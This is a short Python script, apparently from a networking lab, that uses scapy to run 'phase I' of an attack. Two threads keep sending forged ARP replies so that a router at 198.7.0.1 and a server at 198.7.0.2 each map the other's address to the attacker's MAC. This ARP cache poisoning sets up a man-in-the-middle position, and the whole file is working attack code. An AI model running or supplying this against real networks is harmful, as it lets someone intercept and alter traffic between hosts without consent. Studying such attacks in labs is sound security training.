from scapy.all import *
import threading
import time

# PHASE I OF THE ATTACK

def send_arp(my_mac_address, source_ip, destination_ip):
    a = ARP(
            hwsrc=my_mac_address,
            hwdst='ff:ff:ff:ff:ff:ff',
            psrc=source_ip, 
            pdst=destination_ip
            )
    print(f'Poisoning ARP table of {destination_ip}')
    while True:
        send(a, verbose=False)
        time.sleep(2)

my_mac_address = '02:42:c6:07:00:03'
router_ip_address = '198.7.0.1'
server_ip_address = '198.7.0.2'
thread_for_server = threading.Thread(target=send_arp, args=(my_mac_address, router_ip_address, server_ip_address))

thread_for_router = threading.Thread(target=send_arp, args=(my_mac_address, server_ip_address, router_ip_address))

thread_for_server.start()
thread_for_router.start()
